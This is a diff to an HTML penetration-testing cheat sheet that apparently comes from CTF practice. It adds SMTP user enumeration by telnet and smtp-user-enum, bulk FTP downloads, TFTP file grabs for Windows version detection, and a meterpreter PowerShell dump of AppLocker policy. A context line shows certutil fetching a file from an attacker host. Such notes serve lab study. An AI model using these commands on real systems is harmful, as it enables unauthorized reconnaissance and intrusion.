@@ -135,6 +135,25 @@ net view \\[IP_ADDRESS]
 </pre>
 <hr>
 <p><h3>Any SMTP ports available?</h3></p>
+<p><font size="3.5" color="black">User enum (example: megabank.com mail server)</font></p>
+<pre style="background-color:black;color:white;">
+root@Pizduk:~/Desktop/CTFs/Reel# telnet [IP_ADDRESS] 25
+Trying [IP_ADDRESS]...
+Connected to [IP_ADDRESS].
+Escape character is '^]'.
+220 Mail Service ready
+HELO gandosha.ru
+250 Hello.
+MAIL FROM: <gandosha@gandosha.ru>
+250 OK
+RCPT TO: <nico@megabank.com>
+250 OK
+RCPT TO: <BB@megabank.com>
+550 Unknown user
+quit
+Connection closed by foreign host.
+</pre>
+<br>
 <pre style="background-color:black;color:white;">
 smtp-user-enum -M VRFY -U [WORDLIST_PATH] -t [IP_ADDRESS]	(verify if username exists)
 smtp-user-enum -M EXPN -U [WORDLIST_PATH] -t [IP_ADDRESS]	(verify if username is valid)
@@ -172,6 +191,8 @@ root@kali:~# snmpwalk -c public -v1 192.168.11.204 1.3.6.1.2.1.25.4.2.1.2	(Eg: e
 If yes, is directory listing possible? Can a file be ‘get’ or ‘send’?</font></p>
 <pre style="background-color:black;color:white;">
 ftp [IP_ADDRESS]
+ftp> mget *	#get all the files in current directory
+exiftool [FILE]	#extract file's metadata
 </pre>
 <hr>
 <p><h3>Password Cracking / Brute Forcing</h3></p>
@@ -352,6 +373,19 @@ certutil -urlcache -split -f http://[ATTACKERS_MACHINE]/[FILE_TO_TRANSFER] C:\\u
 <p><font size="3.5" color="black">Windows:</font></p>
 <p><font size="3.5" color="black">- http://www.bhafsec.com/wiki/index.php/Windows_Privilege_Escalation</font></p>
 <p><font size="3.5" color="black">- http://www.fuzzysecurity.com/tutorials/16.html</font></p>
+<p><font size="3.5" color="black">Search for license.rtf / eula.txt:</font></p>
+<pre style="background-color:black;color:white;">
+C:\windows\system32\license.rtf #on tftp win xp - "get \windows\system32\license.rtf"
+C:\windows\system32\eula.txt	#on tftp win xp - "get \windows\system32\eula.txt"
+</pre>
+<p><font size="3.5" color="black">AppLocker policy: (on meterpreter's powershell module it works better)</font></p>
+<pre style="background-color:black;color:white;">
+meterpreter > load powershell 
+Loading extension powershell...Success.
+meterpreter > powershell_shell
+PS > get-applockerpolicy -effective -xml | Out-File -filepath "C:\Users\Public\applock_policy.xml"
+</pre>
+<br>
 <pre style="background-color:black;color:white;">
 accesschk.exe /accepteula (first thing to do in CLI access)
 accesschk.exe /accepteula -uwcqv "Authenticated Users" * (won't yield anything on Win 8)
